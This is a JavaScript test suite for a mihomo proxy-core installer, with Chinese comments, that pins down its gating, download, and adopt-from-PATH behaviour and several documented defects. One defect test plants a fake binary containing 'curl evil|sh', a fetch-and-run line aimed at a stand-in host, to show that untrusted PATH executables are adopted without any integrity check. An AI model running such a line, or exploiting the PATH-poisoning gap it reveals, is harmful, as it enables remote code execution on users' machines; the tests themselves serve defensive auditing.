'use strict';

// Co-located contract tests for proxyCoreInstaller.js — the "adopt / download the mihomo core"
// layer. Hard rule: nothing may really spawn, download or write. Every IO leaf is fed through the
// module's own _setDeps hook (spawnSync / download / gunzip / sha256 / fs / platform / env), and
// utils/dataHome is stubbed through require.cache so the landing path points into os.tmpdir()
// instead of the repo's portable .khy home.

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');
const os = require('os');

const DATA_HOME_ID = require.resolve('../../../../utils/dataHome');
const DOWNLOADER_ID = require.resolve('../../desktop/deviceApps/deviceAppsDownloader');
const PREV_DATA_HOME = require.cache[DATA_HOME_ID];
const TMP_HOME = path.join(os.tmpdir(), 'khy-b46-proxy-installer-home');
require.cache[DATA_HOME_ID] = {
  id: DATA_HOME_ID,
  filename: DATA_HOME_ID,
  loaded: true,
  children: [],
  paths: [],
  exports: { getAppHome: () => TMP_HOME },
};

const inst = require('./proxyCoreInstaller');

// ── fake dependency harness ───────────────────────────────────────────────────────────
const H = {
  files: new Map(),
  calls: { access: [], mkdir: [], read: [], write: [], chmod: [], unlink: [], spawn: [], download: [], gunzip: [], sha256: [] },
  installed: false,
  pathHits: new Map(),
  downloadImpl: async () => 'gz-bytes',
  gunzipImpl: (buf) => 'BIN-BYTES',
  fail: {},
  platform: 'linux',
  arch: 'x64',
  env: {},
  flag: true,
};

function fakeFs() {
  return {
    constants: { X_OK: 1 },
    accessSync: (p, mode) => {
      H.calls.access.push([p, mode]);
      if (!H.installed) {
        throw Object.assign(new Error(`ENOENT: no such file, access '${p}'`), { code: 'ENOENT' });
      }
    },
    mkdirSync: (p, opts) => {
      H.calls.mkdir.push([p, opts]);
      if (H.fail.mkdir) throw new Error('mkdir boom');
    },
    readFileSync: (p) => {
      H.calls.read.push(p);
      if (H.fail.read) throw new Error('read boom');
      if (!H.files.has(p)) throw Object.assign(new Error(`ENOENT: open '${p}'`), { code: 'ENOENT' });
      return H.files.get(p);
    },
    writeFileSync: (p, data) => {
      H.calls.write.push([p, data]);
      if (H.fail.write) throw new Error('write boom');
      H.files.set(p, data);
    },
    chmodSync: (p, mode) => {
      H.calls.chmod.push([p, mode]);
      if (H.fail.chmod) throw Object.assign(new Error(`EPERM: chmod '${p}'`), { code: 'EPERM' });
    },
    unlinkSync: (p) => {
      H.calls.unlink.push(p);
      if (H.fail.unlink) throw new Error('unlink boom');
      H.files.delete(p);
    },
    existsSync: (p) => H.files.has(p),
  };
}

function deps() {
  return {
    fs: fakeFs(),
    spawnSync: (cmd, args, opts) => {
      H.calls.spawn.push([cmd, args, opts]);
      const hit = H.pathHits.get(`${cmd}:${args[0]}`);
      return hit || { status: 1, stdout: '' };
    },
    gunzip: (buf) => {
      H.calls.gunzip.push(buf);
      return H.gunzipImpl(buf);
    },
    sha256: (buf) => {
      H.calls.sha256.push(buf);
      return 'AAABBCCCAABBCCCCAABBCCCCAABBCCCCAABBCCCCAABBCCCCAABBCCCCAABBCCCC1122';
    },
    download: async (url, dest, onProgress, opts) => {
      H.calls.download.push([url, dest, onProgress, opts]);
      return H.downloadImpl(url, dest, onProgress, opts);
    },
    // 门语义镜像真 flagRegistry:显式传入 env 时按值判定(0/false/off/no 关,大小写与空白无关),
    // 未设键时回落到 H.flag(用例可注入的默认档)。此前 () => H.flag 对 env 全盲,
    // 导致「自动安装门」两例无论喂什么都返回 true。
    isFlagEnabled: (name, env) => {
      const raw = env ? env[name] : undefined;
      if (raw === undefined) return H.flag;
      return !['0', 'false', 'off', 'no'].includes(String(raw).trim().toLowerCase());
    },
    platform: () => H.platform,
    arch: () => H.arch,
    homedir: () => TMP_HOME,
    env: () => H.env,
  };
}

let _restore = null;
before(() => {
  _restore = inst._setDeps(deps());
});
after(() => {
  if (_restore) _restore();
  if (PREV_DATA_HOME) require.cache[DATA_HOME_ID] = PREV_DATA_HOME;
  else delete require.cache[DATA_HOME_ID];
});

/** Swap the injected deps for one test and restore afterwards. */
async function withDeps(overrides, fn) {
  // 被覆盖的 H 键用完必须还原:否则 platform/flag/installed/pathHits 会跨用例泄漏
  // (实测:win32 覆盖泄漏让后续 adopt 全走 where、installed 泄漏让后续 install 全变 existing)。
  const prev = {};
  for (const k of Object.keys(overrides)) prev[k] = H[k];
  Object.assign(H, overrides);
  H.calls = { access: [], mkdir: [], read: [], write: [], chmod: [], unlink: [], spawn: [], download: [], gunzip: [], sha256: [] };
  H.files = new Map();
  H.fail = {};
  H.downloadImpl = async () => 'gz-bytes';
  H.gunzipImpl = () => 'BIN-BYTES';
  const restore = inst._setDeps(deps());
  try {
    return await fn();
  } finally {
    restore();
    for (const k of Object.keys(prev)) H[k] = prev[k];
  }
}

const DEST = path.join(TMP_HOME, 'bin', 'mihomo');
const TMP_DL = `${DEST}.download`;

// ── gating ────────────────────────────────────────────────────────────────────────────
test('自动安装门:默认开,仅 0/false/off/no 关(大小写与空白无关)', () => {
  for (const off of ['0', 'false', 'off', 'no', ' OFF ', 'No', 0, false]) {
    assert.equal(inst.isEnabled({ KHY_PROXY_CORE_AUTO_INSTALL: off }), false, JSON.stringify(off));
  }
  for (const on of ['1', 'true', 'yes', '', ' ', 'nope', undefined]) {
    assert.equal(inst.isEnabled({ KHY_PROXY_CORE_AUTO_INSTALL: on }), true, JSON.stringify(on));
  }
  assert.equal(inst.isEnabled({}), true, '缺省即开(default-on)');
});

test('门判定经真 flagRegistry;注册表抛错时 fail-closed 视为关', () => {
  assert.equal(inst.isEnabled({ KHY_PROXY_CORE_AUTO_INSTALL: '0' }), false);
  // 真 flagRegistry 走通的路径已由上一例证明;这里换成会抛的 fake → 捕获后返回 false(不联网)。
  const restore = inst._setDeps({ isFlagEnabled: () => { throw new Error('registry down'); } });
  try {
    assert.equal(inst.isEnabled({}), false);
    assert.equal(inst.isEnabled({ KHY_PROXY_CORE_AUTO_INSTALL: '1' }), false, '异常一律关,绝不因取不到门就联网');
  } finally {
    restore();
  }
});

// ── asset resolution ──────────────────────────────────────────────────────────────────
test('resolveAsset 只认五个已知平台,URL 由固定版本前缀拼出', () => {
  const linux = inst.resolveAsset('linux', 'x64');
  assert.equal(linux.key, 'linux:x64');
  assert.equal(linux.kind, 'gz');
  assert.match(linux.file, /^mihomo-linux-amd64-compatible-v\d+\.\d+\.\d+\.gz$/);
  assert.equal(linux.url, `${inst.RELEASE_BASE}/${linux.file}`);
  assert.equal(linux.url.startsWith('https://github.com/MetaCubeX/mihomo/releases/download/'), true);
  assert.equal(inst.resolveAsset('win32', 'x64').kind, 'zip');
  assert.equal(inst.resolveAsset('darwin', 'arm64').file, `mihomo-darwin-arm64-${inst.PINNED_VERSION}.gz`);
  for (const bad of [['linux', 'ia32'], ['win32', 'arm64'], ['freebsd', 'x64'], ['', ''], [undefined, undefined], [null, null]]) {
    assert.equal(inst.resolveAsset(bad[0], bad[1]), null, JSON.stringify(bad));
  }
});

test('describeCoreDownload 冷门平台也给 releases 总页与落地路径,绝不留死路', () => {
  const sup = inst.describeCoreDownload('linux', 'x64');
  assert.equal(sup.supported, true);
  assert.equal(sup.dest, DEST);
  assert.equal(sup.binDir, path.dirname(DEST));
  assert.equal(sup.version, inst.PINNED_VERSION);
  assert.equal(sup.url, inst.resolveAsset('linux', 'x64').url);
  assert.equal(sup.kind, 'gz');

  const cold = inst.describeCoreDownload('sunos', 'sparc');
  assert.equal(cold.supported, false);
  assert.equal('url' in cold, false);
  assert.equal('assetFile' in cold, false);
  assert.equal(cold.platform, 'sunos');
  assert.equal(cold.releasesPage, 'https://github.com/MetaCubeX/mihomo/releases');
  assert.equal(cold.dest, DEST);
});

test('KNOWN-DEFECT: 冷门平台入参被真值门换成当前进程平台', () => {
  // proxyCoreInstaller.js:157-158 `platform || _deps.platform()`、`arch || _deps.arch()`:
  // 显式传入空串(如从下拉框取到 '' 的表单值)会被顶掉,描述符里的 platform 字段与调用方
  // 请求的不一致,而 supported 判定也跟着翻转。
  return withDeps({ platform: 'linux', arch: 'x64' }, () => {
    const got = inst.describeCoreDownload('', '');
    assert.equal(got.platform, 'linux');
    assert.equal(got.supported, true);
    const explicit = inst.describeCoreDownload('sunos', 'sparc');
    assert.equal(explicit.supported, false);
    const half = inst.describeCoreDownload('win32');
    assert.equal(half.arch, 'x64', 'arch 缺省同样取进程架构');
    assert.equal(half.kind, 'zip');
  });
});

// ── isInstalled / binary path ─────────────────────────────────────────────────────────
test('isInstalled 用 X_OK 判可执行,任何异常都收敛成 false', () => {
  return withDeps({ installed: true }, () => {
    assert.equal(inst.isInstalled(), true);
    assert.deepEqual(H.calls.access[0], [DEST, 1]);
  }).then(() => withDeps({ installed: false }, () => {
    assert.equal(inst.isInstalled(), false);
  })).then(() => withDeps({}, () => {
    const restore = inst._setDeps({ fs: { constants: { X_OK: 1 }, accessSync() { throw new Error('EACCES'); } } });
    try {
      assert.equal(inst.isInstalled(), false);
    } finally {
      restore();
    }
  }));
});

test('KNOWN-DEFECT: 内核落地路径与 proxyCoreManager 的二进制名判定口径不同(平台来源不一致)', () => {
  // proxyCoreInstaller.js:109 用可注入的 _deps.platform()(便于离线演练全宿主),
  // 而 proxyCoreManager.js:46 的 BINARY_NAME 在 require 期就按真实 process.platform 冻结。
  // 于是 fake 演练里 installer 落地 mihomo、manager 却去找 mihomo.exe —— 自动安装成功却永远
  // 判定"未安装"。这里把两侧口径钉住,任何一侧改动都会被本例抓到。
  return withDeps({ platform: 'win32' }, () => {
    assert.equal(inst._binaryPath(), path.join(TMP_HOME, 'bin', 'mihomo.exe'));
    const mgr = require('./proxyCoreManager');
    // manager 用冻结的 process.platform:仅当宿主不是 win32 时两侧路径才可区分;
    // win32 宿主上注入面与冻结面同为 win32,两路路径重合(这正是本 KNOWN-DEFECT 的退化形态)。
    if (process.platform !== 'win32') {
      assert.notEqual(mgr.getBinaryPath(), inst._binaryPath(), 'manager 用冻结的 process.platform');
    }
    assert.equal(path.basename(mgr.getBinaryPath()), process.platform === 'win32' ? 'mihomo.exe' : 'mihomo');
  }).then(() => withDeps({ platform: 'linux' }, () => {
    assert.equal(inst._binaryPath(), DEST);
  }));
});

// ── adoptFromPath ─────────────────────────────────────────────────────────────────────
test('adoptFromPath 采纳 PATH 上首个命中并按五候选顺序探测', () => {
  return withDeps({
    pathHits: new Map([['which:clash-meta', { status: 0, stdout: '/opt/bin/clash-meta\r\n/usr/bin/clash-meta\r\n' }]]),
  }, () => {
    H.files.set('/opt/bin/clash-meta', Buffer.from('ELF-CORE'));
    const r = inst.adoptFromPath();
    assert.deepEqual(r, { success: true, method: 'adopted', path: DEST, source: '/opt/bin/clash-meta' });
    assert.equal(H.calls.spawn.length, 2, 'mihomo 未命中、clash-meta 命中后停止');
    assert.deepEqual(H.calls.spawn[0], ['which', ['mihomo'], { encoding: 'utf-8', timeout: 5000 }]);
    assert.equal(H.calls.spawn[1][1][0], 'clash-meta');
    assert.deepEqual(H.calls.write, [[DEST, Buffer.from('ELF-CORE')]]);
    assert.deepEqual(H.calls.chmod, [[DEST, 0o755]]);
    assert.deepEqual(H.calls.mkdir, [[path.dirname(DEST), { recursive: true }]]);
    assert.equal(H.calls.download.length, 0, '采纳路径绝不联网');
  });
});

test('PATH 全未命中时返回 not-on-path,且 spawnSync 抛错只跳过该候选', () => {
  return withDeps({ pathHits: new Map() }, () => {
    assert.deepEqual(inst.adoptFromPath(), { success: false, reason: 'not-on-path' });
    assert.equal(H.calls.spawn.length, 5, '五个候选全部探测');
    assert.deepEqual(H.calls.spawn.map((c) => c[1][0]), inst.PATH_CANDIDATES);
    assert.equal(H.calls.write.length, 0);
  }).then(() => withDeps({ pathHits: new Map() }, () => {
    const restore = inst._setDeps({
      spawnSync: (cmd, args) => {
        H.calls.spawn.push([cmd, args]);
        if (args[0] === 'clash') throw new Error('spawn blocked');
        return { status: 1, stdout: '' };
      },
    });
    try {
      assert.deepEqual(inst.adoptFromPath(), { success: false, reason: 'not-on-path' });
    } finally {
      restore();
    }
  }));
});

test('which 输出 status!=0 或空白 stdout 一律视为未命中;首个非空行才是命中路径', () => {
  return withDeps({
    pathHits: new Map([
      ['which:mihomo', { status: 1, stdout: '/fake/mihomo' }],
      ['which:clash-meta', { status: 0, stdout: '   \n\r\n' }],
      ['which:clash.meta', { status: 0, stdout: '\n\n  /real/path/clash.meta  \n' }],
    ]),
  }, () => {
    H.files.set('/real/path/clash.meta', Buffer.from('X'));
    assert.equal(inst.adoptFromPath().source, '/real/path/clash.meta');
    assert.equal(H.calls.spawn.length, 3);
  });
});

test('KNOWN-DEFECT: 采纳 PATH 命中完全无信任校验,复制的是内容而非符号链接', () => {
  // proxyCoreInstaller.js:191-241:_whichCore 只要 `which <候选名>` 返回 0 就拿首个路径,
  // 随后 readFileSync(src) + writeFileSync(dest) 复制内容并 chmod 0o755;既不比对指纹、不校验
  // 来源目录是否可信(PATH 可被任意脚本/工作区前置),也不校验它是可执行文件。
  // 结果:仓库/临时目录里一个叫 `clash` 的脚本会被"采纳"成 khy 的代理内核,后续由
  // proxyCoreManager 直接 spawn。同时符号链接被物化成真实副本(丢 -mihomo 版本链接语义)。
  return withDeps({
    pathHits: new Map([['which:mihomo', { status: 0, stdout: '/tmp/poison/mihomo\n' }]]),
  }, () => {
    H.files.set('/tmp/poison/mihomo', Buffer.from('#!/bin/sh\ncurl evil|sh\n'));
    const r = inst.adoptFromPath();
    assert.equal(r.success, true);
    assert.equal(r.source, '/tmp/poison/mihomo');
    assert.deepEqual(H.calls.write[0], [DEST, Buffer.from('#!/bin/sh\ncurl evil|sh\n')]);
    assert.equal(H.calls.chmod[0][1], 0o755, '无指纹校验却直接给可执行位');
    assert.equal(H.calls.sha256.length, 0, '采纳链路根本没调用哈希能力');
  });
});

test('采纳中途失败(EACCES 等)收敛成 adopt-failed,绝不抛', () => {
  return withDeps({
    pathHits: new Map([['which:mihomo', { status: 0, stdout: '/opt/bin/mihomo\n' }]]),
  }, () => {
    H.fail.read = true;
    const r = inst.adoptFromPath();
    assert.equal(r.success, false);
    assert.equal(r.reason, 'adopt-failed');
    assert.match(r.error, /read boom/);
  }).then(() => withDeps({
    pathHits: new Map([['which:mihomo', { status: 0, stdout: '/opt/bin/mihomo\n' }]]),
    fail: {},
  }, () => {
    // chmod 失败被吞掉(Windows 无 chmod 语义),仍算成功。
    H.fail.chmod = true;
    H.files.set('/opt/bin/mihomo', Buffer.from('B'));
    assert.equal(inst.adoptFromPath().success, true);
  }));
});

// ── downloadCore ──────────────────────────────────────────────────────────────────────
test('downloadCore 门关时直接 disabled,连一次下载都不发起', () => {
  return withDeps({ flag: false }, async () => {
    assert.deepEqual(await inst.downloadCore(), { success: false, reason: 'disabled' });
    assert.deepEqual(await inst.downloadCore({ env: { KHY_PROXY_CORE_AUTO_INSTALL: '0' } }), { success: false, reason: 'disabled' });
    assert.equal(H.calls.download.length, 0);
    assert.equal(H.calls.mkdir.length, 0);
  });
});

test('downloadCore 冷门平台与 zip 平台各给专属 reason,后者带手动指引且仍不联网', () => {
  return withDeps({ platform: 'freebsd' }, async () => {
    assert.deepEqual(await inst.downloadCore(), {
      success: false, reason: 'unsupported-platform', platform: 'freebsd', arch: 'x64',
    });
    assert.equal(H.calls.download.length, 0);
  }).then(() => withDeps({ platform: 'win32', arch: 'x64' }, async () => {
    const r = await inst.downloadCore();
    assert.equal(r.success, false);
    assert.equal(r.reason, 'unpack-unsupported');
    assert.match(r.guidance, /请手动下载 https:\/\/github\.com\/MetaCubeX\/mihomo\/releases\/download\/v1\.18\.10\/mihomo-windows-amd64-v1\.18\.10\.zip/);
    assert.match(r.guidance, /解压出 mihomo\.exe/);
    assert.equal(r.url, inst.resolveAsset('win32', 'x64').url);
    assert.equal(H.calls.download.length, 0, 'zip 分支在联网前就返回');
  }));
});

test('downloadCore 成功链路:下载→读回→gunzip→落地 0o755→清理临时文件,integrity 如实标 https-official', () => {
  return withDeps({ installed: false }, async () => {
    H.downloadImpl = async (url, dest) => {
      H.files.set(dest, Buffer.from('GZPAYLOAD'));
      return dest;
    };
    const progress = () => {};
    const r = await inst.downloadCore({ onProgress: progress, timeoutMs: 1234 });
    assert.equal(r.success, true);
    assert.equal(r.method, 'downloaded');
    assert.equal(r.integrity, 'https-official');
    assert.equal(r.path, DEST);
    assert.equal(r.version, inst.PINNED_VERSION);
    assert.equal(r.url, inst.resolveAsset('linux', 'x64').url);
    // 下载只打固定官方 URL,且临时文件在 bin 目录下。
    assert.equal(H.calls.download.length, 1);
    assert.equal(H.calls.download[0][0], inst.resolveAsset('linux', 'x64').url);
    assert.equal(H.calls.download[0][1], TMP_DL);
    assert.equal(H.calls.download[0][2], progress);
    assert.deepEqual(H.calls.download[0][3], { timeoutMs: 1234 });
    assert.deepEqual(H.calls.mkdir, [[path.dirname(DEST), { recursive: true }]]);
    assert.deepEqual(H.calls.gunzip, [Buffer.from('GZPAYLOAD')]);
    assert.deepEqual(H.calls.write, [[DEST, 'BIN-BYTES']]);
    assert.deepEqual(H.calls.chmod, [[DEST, 0o755]]);
    assert.equal(H.calls.unlink[H.calls.unlink.length - 1], TMP_DL, '成功后删除残留临时文件');
    assert.equal(H.calls.sha256.length, 0, '未预置指纹 → 哈希能力根本不被调用');
  });
});

test('KNOWN-DEFECT: 指纹校验分支是死代码 —— ASSETS 全为 sha256:null,下载完整性永远只剩 HTTPS', () => {
  // proxyCoreInstaller.js:54-64 五个资产的 sha256 全为 null;:313 的 `if (asset.sha256)` 永不成立,
  // 于是 :325-334 的 fail-closed(mismatch 即删除、不解压、不落地)在生产路径不可达,
  // method 永远是 'downloaded'、integrity 永远是 'https-official'。
  // 'downloaded-verified'/'sha256-pinned' 两个字符串在仓库里没有任何生产者。
  for (const key of Object.keys(inst.ASSETS)) {
    const [p, a] = key.split(':');
    assert.equal(inst.resolveAsset(p, a).sha256, null, `${key} 应仍未预置指纹`);
  }
  return withDeps({}, async () => {
    H.downloadImpl = async (url, dest) => { H.files.set(dest, Buffer.from('GZ')); };
    const r = await inst.downloadCore();
    assert.equal(r.method, 'downloaded');
    assert.equal(r.integrity, 'https-official');
    assert.notEqual(r.method, 'downloaded-verified');
    assert.equal(H.calls.sha256.length, 0);
  });
});

test('KNOWN-DEFECT: 下载失败/解压失败/落地失败后临时残留清理依赖 unlink 也成功', () => {
  return withDeps({}, async () => {
    H.downloadImpl = async () => { throw Object.assign(new Error('ETIMEDOUT'), { code: 'ETIMEDOUT' }); };
    const r = await inst.downloadCore();
    assert.equal(r.reason, 'download-failed');
    assert.equal(r.error, 'ETIMEDOUT');
    assert.equal(r.url, inst.resolveAsset('linux', 'x64').url);
    assert.deepEqual(H.calls.unlink, [TMP_DL, TMP_DL], '进门先清残留 + 失败再清一次');
    assert.equal(H.calls.write.length, 0);

    // gunzip 抛错 → unpack-failed,同样不落盘。
    H.gunzipImpl = () => { throw new Error('not gzipped'); };
    H.downloadImpl = async (url, dest) => { H.files.set(dest, Buffer.from('<html>404</html>')); };
    const u = await inst.downloadCore();
    assert.equal(u.reason, 'unpack-failed');
    assert.match(u.error, /not gzipped/);
    assert.equal(H.calls.write.length, 0);
  }).then(() => withDeps({}, async () => {
    // 写盘失败:临时文件仍被清理。
    H.downloadImpl = async (url, dest) => { H.files.set(dest, Buffer.from('GZ')); };
    H.fail = { write: true };
    const w = await inst.downloadCore();
    assert.equal(w.reason, 'write-failed');
    assert.match(w.error, /write boom/);
    assert.equal(H.calls.unlink[H.calls.unlink.length - 1], TMP_DL);
    assert.deepEqual(H.calls.chmod, [], '写盘失败就不该 chmod');
  }));
});

test('mkdir 失败在联网前收敛成 mkdir-failed;下载后读不回则 read-failed', () => {
  return withDeps({}, async () => {
    H.fail = { mkdir: true };
    assert.deepEqual(await inst.downloadCore(), { success: false, reason: 'mkdir-failed', error: 'mkdir boom' });
    assert.equal(H.calls.download.length, 0, '目录建不出来时绝不联网');
  }).then(() => withDeps({}, async () => {
    // 下载"成功"但目标文件读不回(下载器只写远端流)。
    H.downloadImpl = async () => 'nothing';
    H.fail = { read: true };
    const r = await inst.downloadCore();
    assert.equal(r.reason, 'read-failed');
    assert.match(r.error, /read boom/);
    assert.equal(H.calls.unlink[H.calls.unlink.length - 1], TMP_DL);
  }));
});

test('KNOWN-DEFECT: downloadCore 不做任何参数校验,options 为 null 直接 reject(违背"绝不抛")', () => {
  // proxyCoreInstaller.js:248 的 `opts = {}` 只挡 undefined,:249 立刻读 opts.env。
  // 而 :29 的契约声明"任何失败 fail-soft 返回结构化结果"。
  return assert.rejects(() => inst.downloadCore(null), TypeError)
    .then(() => inst.downloadCore(0).then((r) => {
      // 0 装箱后 .env 是 undefined,不抛 → 与 'auto' 同路:退回进程环境(门默认开)继续走到下载。
      assert.equal(typeof r.success, 'boolean');
    }))
    .then(() => inst.downloadCore('auto').then((r) => {
      assert.equal(typeof r.success, 'boolean');
    }));
});

// ── install orchestration ─────────────────────────────────────────────────────────────
test('install 已装时短路 existing,既不 which 也不联网', () => {
  return withDeps({ installed: true }, async () => {
    assert.deepEqual(await inst.install(), { success: true, method: 'existing', path: DEST });
    assert.equal(H.calls.spawn.length, 0);
    assert.equal(H.calls.download.length, 0);
    assert.equal(H.calls.write.length, 0);
  });
});

test('install 优先采纳本机内核,即使联网门是开的', () => {
  return withDeps({
    flag: true,
    pathHits: new Map([['which:mihomo', { status: 0, stdout: '/opt/mihomo\n' }]]),
  }, async () => {
    H.files.set('/opt/mihomo', Buffer.from('BINARY'));
    const r = await inst.install();
    assert.deepEqual(r, { success: true, method: 'adopted', path: DEST, source: '/opt/mihomo' });
    assert.equal(H.calls.download.length, 0);
  });
});

test('install 门关时给可执行的手动指引(含门名与落地路径),并说明可设 1 重试', () => {
  return withDeps({ flag: false }, async () => {
    const r = await inst.install();
    assert.equal(r.success, false);
    assert.equal(r.reason, 'disabled');
    assert.match(r.guidance, /KHY_PROXY_CORE_AUTO_INSTALL=0/);
    assert.ok(r.guidance.includes(DEST), '指引必须包含真实落地路径');
    assert.match(r.guidance, /设 KHY_PROXY_CORE_AUTO_INSTALL=1/);
    assert.equal(H.calls.download.length, 0);
  });
});

test('install 门开且 PATH 无内核时落到 downloadCore,并把 opts 原样透传', () => {
  return withDeps({ flag: true, pathHits: new Map() }, async () => {
    H.downloadImpl = async (url, dest) => { H.files.set(dest, Buffer.from('GZ')); };
    const onProgress = () => {};
    const r = await inst.install({ onProgress, timeoutMs: 99 });
    assert.equal(r.success, true);
    assert.equal(r.method, 'downloaded');
    assert.equal(H.calls.download.length, 1);
    assert.equal(H.calls.download[0][2], onProgress);
    assert.deepEqual(H.calls.download[0][3], { timeoutMs: 99 });
    assert.equal(H.calls.spawn.length, 5, '先做过 PATH 探测');
  });
});

test('install 兜底 fail-soft:炸裂只返回结构化结果,绝不 reject(外层 error / 内层 mkdir-failed 各归各层)', () => {
  return withDeps({}, async () => {
    assert.deepEqual(await inst.install(null), {
      success: false, reason: 'error', error: "Cannot read properties of null (reading 'env')",
    });
  }).then(() => withDeps({}, async () => {
    const restore = inst._setDeps({ fs: 'not-an-object' });
    try {
      const r = await inst.install();
      assert.equal(r.success, false);
      // fs 炸在 mkdir:downloadCore 内层 catch 先接住并给出结构化 reason,轮不到外层 catch
      // (外层只接内层没接住的,如上例的 opts.env 读取)。
      assert.equal(r.reason, 'mkdir-failed');
      assert.match(r.error, /is not a function|Cannot read/);
    } finally {
      restore();
    }
  }));
});

test('_setDeps 只覆盖显式给出的键并精确还原(含覆盖 installer 自身的依赖)', () => {
  const before = inst._binaryPath();
  // homedir 是 _binaryPath 的兜底,但文件头部的 dataHome 存根常驻命中 → homedir 覆盖不可观测,
  // 故用 arch 验证「覆盖/还原」,binDir 断言改为钉住 dataHome 优先这一事实。
  const restore = inst._setDeps({ homedir: () => path.join(TMP_HOME, 'other'), arch: () => 'arm64' });
  try {
    assert.equal(inst.describeCoreDownload().arch, 'arm64', '显式给出的键立即生效');
    assert.equal(inst.describeCoreDownload('sunos', 'sparc').binDir, path.join(TMP_HOME, 'bin'),
      'homedir 覆盖不影响落地路径:getAppHome() 命中时 homedir 兜底不可达');
  } finally {
    restore();
  }
  assert.equal(inst._binaryPath(), before, '还原后回到注入的 TMP_HOME/bin');
  assert.equal(inst.describeCoreDownload().arch, 'x64', '还原后 arch 回到注入的 x64');
  // 覆盖一个不存在的键也会"还原成 undefined"——但未被点名的键必须原样保留。
  const r2 = inst._setDeps({ platform: () => 'darwin' });
  try {
    assert.equal(inst.resolveAsset('darwin', 'arm64').kind, 'gz');
    assert.equal(inst.describeCoreDownload().platform, 'darwin');
  } finally {
    r2();
  }
  assert.equal(inst.describeCoreDownload().platform, 'linux');
});

test('全链路只碰注入的 fake:真下载器与真 child_process 从未被 require/调用', () => {
  assert.equal(require.cache[DOWNLOADER_ID], undefined, 'deviceAppsDownloader 未被加载');
  return withDeps({ flag: true, pathHits: new Map() }, async () => {
    H.downloadImpl = async (url, dest) => { H.files.set(dest, Buffer.from('GZ')); };
    await inst.install();
    assert.equal(H.calls.download.length, 1);
    assert.equal(require.cache[DOWNLOADER_ID], undefined, '联网出口始终没被加载');
    assert.ok(H.calls.spawn.every((c) => c[0] === 'which' || c[0] === 'where'));
  });
});
